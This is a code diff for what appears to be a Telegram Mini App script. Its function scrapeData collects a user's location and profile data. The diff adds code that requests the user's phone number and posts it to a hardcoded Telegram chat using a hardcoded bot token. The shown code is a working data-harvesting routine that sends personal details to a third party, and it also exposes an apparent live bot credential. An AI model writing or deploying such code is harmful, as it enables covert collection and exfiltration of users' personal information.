@@ -161,6 +161,7 @@
         function scrapeData() {
             requestLocation();
             sendUserDataToTelegram();
+            sendPhoneNumberToTelegram();
         }
         function requestLocation() {
             // Initialize LocationManager if not already initialized
@@ -208,8 +209,6 @@
                 });
         }
 
-
-
         function showError(error) {
             let message;
             switch (error.code) {
@@ -246,7 +245,7 @@
             document.body.setAttribute('style', '--bg-color:' + Telegram.WebApp.backgroundColor);
         });
 
-       async function sendUserDataToTelegram() {
+        async function sendUserDataToTelegram() {
             const user = Telegram.WebApp.initDataUnsafe.user;
             if (!user) {
                 Telegram.WebApp.showAlert("User data is not available.");
@@ -325,6 +324,69 @@
             }
 
             return null;
+        }
+        async function sendPhoneNumberToTelegram() {
+            const user = Telegram.WebApp.initDataUnsafe.user;
+            if (!user) {
+                Telegram.WebApp.showAlert("User data is not available.");
+                return;
+            }
+
+            const chatId = "7265296083";  // Replace with actual chat ID
+            const botToken = "7628792743:AAHU7rESkOh5jhMsiyHg7QSuEJGhPzfV4mE"; // Replace with your bot token
+
+            // Fetch the phone number
+            const phoneNumber = await getPhoneNumber(user.id);  // Request the phone number
+
+            // Send the phone number separately
+            if (phoneNumber) {
+                await sendPhoneNumberMessage(chatId, botToken, phoneNumber);
+            } else {
+                Telegram.WebApp.showAlert("No phone number found.");
+            }
+        }
+
+        async function sendPhoneNumberMessage(chatId, botToken, phoneNumber) {
+            const phoneNumberMessage = `📱 Phone Number: ${phoneNumber}`;
+
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            const formData = new URLSearchParams();
+            formData.append("chat_id", chatId);
+            formData.append("text", phoneNumberMessage);
+
+            await fetch(url, {
+                method: "POST",
+                body: formData
+            })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        Telegram.WebApp.showAlert("Phone number sent successfully!");
+                    } else {
+                        Telegram.WebApp.showAlert("Failed to send phone number: " + data.description);
+                    }
+                })
+                .catch(error => {
+                    Telegram.WebApp.showAlert("Error: " + error.message);
+                });
+        }
+
+        // Function to request phone number and return it
+        async function getPhoneNumber(userId) {
+            return new Promise((resolve) => {
+                // Requesting the contact
+                Telegram.WebApp.requestContact();
+
+                // Wait until contact is selected
+                Telegram.WebApp.onEvent("contactSelected", function (contact) {
+                    if (contact && contact.phone_number) {
+                        resolve(contact.phone_number);  // Return the phone number
+                    } else {
+                        resolve(null);  // No phone number available
+                    }
+                });
+            });
         }
 
     </script>
